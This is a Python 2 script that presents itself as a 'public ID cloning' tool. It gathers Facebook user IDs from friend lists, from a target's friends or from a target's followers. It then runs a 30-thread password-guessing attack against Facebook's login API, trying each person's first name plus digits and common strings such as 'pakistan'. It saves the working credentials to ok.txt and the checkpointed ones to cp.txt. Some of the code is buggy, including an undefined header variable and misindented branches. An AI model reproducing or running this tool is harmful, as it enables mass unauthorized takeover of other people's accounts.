#Script By Tamay
#Compelety Coded by Tamay

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 friend.py')
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
headers = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')]
os.system('git pull')
os.system('clear')

logo = """
\033[1;94m 
\033[1;92m 
\033[1;93m 
\033[1;92m 
\033[1;94m     #     #    #    #       ### #    # 
\033[1;92m     ##   ##   # #   #        #  #   #  
\033[1;93m     # # # #  #   #  #        #  #  #   
\033[1;95m     #  #  # #     # #        #  ###    
\033[1;94m     #     # ####### #        #  #  #
\033[1;96m     #     # #     # #        #  #   #
\033[1;97m     #     # #     # ####### ### #    #                                      
\033[1;94m                                 
     \033[31;1m[\033[43;1m Public Id cloning \033[00;1m\033[31;1m ]\n
     \033[32;1mCreator \033[37;1m: \033[33;1mMalik Asghar Latif
     \033[32;1mFB ID   \033[37;1m: \033[33;1mAsghar Latif
"""
    
def main():
    os.system('clear')
    print logo
    print ''
    print ('\x1b[0;93m( Main Menu )').center(50)
    print ''
    print '\x1b[1;97m[1] \x1b[1;92mClone From Public Friends (B-Api Method)'
    print ''
    print '\x1b[1;97m[2] \x1b[1;92mFollow me on fb'
    print ''
    print '\x1b[1;97m[0] \x1b[1;92mLogout'
    print ''
    main_select()


def main_select():
    madman = raw_input('\x1b[1;97m[!] Select --->\x1b[1;96m ')
    if madman == '1':
        login()
    if madman == '2':
        os.system('xdg-open https://www.facebook.com/malikasghar.latif.9')
        main()
    elif madman == '0':
        os.system('exit')
    else:
        print ('[!] Please select a valid option').center(50)
        time.sleep(2)
        main()


def login():
    os.system('clear')
    print logo
    print ''
    print ('\x1b[0;93m[ Login Main Menu ]').center(50)
    print ''
    print '\x1b[1;97m[1] \x1b[1;92mLogin using token'
    print ''
    print '\x1b[1;97m[2] \x1b[1;92mlogin using password'
    print ''
    print '\x1b[1;97m[3]\x1b[1;91m > \x1b[1;97mMain menu back'
    print ''
    login_select()


def login_select():
    madman = raw_input(' \x1b[1;97mOption :\x1b[1;96m ')
    if madman == '1':
        os.system('clear')
        print logo
        print ''
        print ('( login with token )').center(50)
        print ''
        token = raw_input('[!] Token ? \x1b[0;91m')
        token_s = open('.fb_token.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print ('\x1b[1;92mYour token login successfully').center(50)
            time.sleep(1)
            os.system('xdg-open https://github.com/Alimurtaza330')
            time.sleep(1)
            menu()
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91mToken invalid or account has checkpoint\x1b[0;97m').center(50)
            print ''
            time.sleep(2)
            login()

    elif madman == '2':
        login_fb()
    elif madman == '3':
        main()
    else:
        print ''
        print ('Select a valid option').center(50)
        print ''
        login_select()


def login_fb():
    os.system('clear')
    print logo
    print ''
    print ('[ login with password ]').center(50)
    print ''
    id = raw_input('[!] \x1b[1;93m Email/ID/Number :\x1b[1;97m ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('[!] \x1b[1;93m Passwor :\x1b[1;97m ')
    print ''
    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
    q = json.loads(data)
    if 'access_token' in q:
        login_s = open('.login.txt', 'w')
        login_s.write(q['access_token'])
        login_s.close()
        print '\t\x1b[1;92mLogin Ok With Sahu\x1b[0;97m'
        time.sleep(1)
        menu()
    elif 'www.facebook.com' in q['error_msg']:
        print '\n\x1b[1;91m[!] Login Failed . Account Has a Checkpoint\x1b[0;97m'
        time.sleep(1)
        login_fb()
    else:
        print '\n\x1b[1;91m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\x1b[0;97m'
        time.sleep(1)
        login_fb()


def menu():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print ('login account has checkpoint').center(50)
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print ('Your internet connection not working').center(50)
        print ''
        time.sleep(2)
        menu()

    os.system('clear')
    print logo
    print ''
    print '\t\x1b[1;92mHello : ' + nm
    print ''
    print '\x1b[1;92m[1] \x1b[1;91mCrack From Friendlist'
    print ''
    print '\x1b[1;93m[2] \x1b[1;91mCrack From Public id'
    print ''
    print '\x1b[1;93m[3] \x1b[1;91mCrack From Followers id'
    print ''
    print '\x1b[1;97m[0] \x1b[1;91mLogout'
    print ''
    menu_select()


def menu_select():
    select = raw_input('\x1b[1;93mOption : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    if select == '2':
        os.system('clear')
        print logo
        print ''
        idt = raw_input('\x1b[1;97m[!] Put Target/ID :\x1b[1;96m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            print '[!] Target from : ' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91your login account has checkpoint').center(50)
            print ''
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print ''
        idt = raw_input('\x1b[1;97m[!] Put Target/ID :\x1b[1;96m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' Target from  : ' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91m login id has checkpoint').center(50)
            print ''
            time.sleep(3)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        os.system('exit')
    else:
        print ''
        print ('Please Select A Valid Option').center(50)
        time.sleep(2)
        menu_select()
    print '[!] Total IDs : ' + str(len(id))
    time.sleep(0.5)
    print '[!] Plz wait clone account will be appear here'
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '[CP] ' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;96m[OK] ' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '[CP] ' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;96m[OK] ' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '[CP] ' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;96m[OK] ' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '[CP] ' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;96m[OK] ' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786000'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '[CP] ' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;96m[OK] ' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '223344'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '[CP] ' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;96m[OK] ' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = 'pakistan'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[CP] ' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;96m[OK] ' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        pass8 = '234567'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[CP] ' + uid + ' | ' + pass8
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass8 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;96m[OK] ' + uid + ' | ' + pass8 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                    	pass9 = '556677'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[CP] ' + uid + ' | ' + pass9
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass9 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;96m[OK] ' + uid + ' | ' + pass9 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass9 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                    	pass10 = '334455'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[CP] ' + uid + ' | ' + pass10
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass10 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;96m[OK] ' + uid + ' | ' + pass10 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass10 + '\n')
                                        ok.close()
                                        oks.append(uid)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    print 47 * '-'
    print '[!] Process has completed'
    print '[!] Total Cp/Ok : ' + str(len(cps)) + '/' + str(len(oks))
    print 47 * '-'
    raw_input('\t\x1b[0;97mPress enter to main menu back')
    menu()


if __name__ == '__main__':
    main()
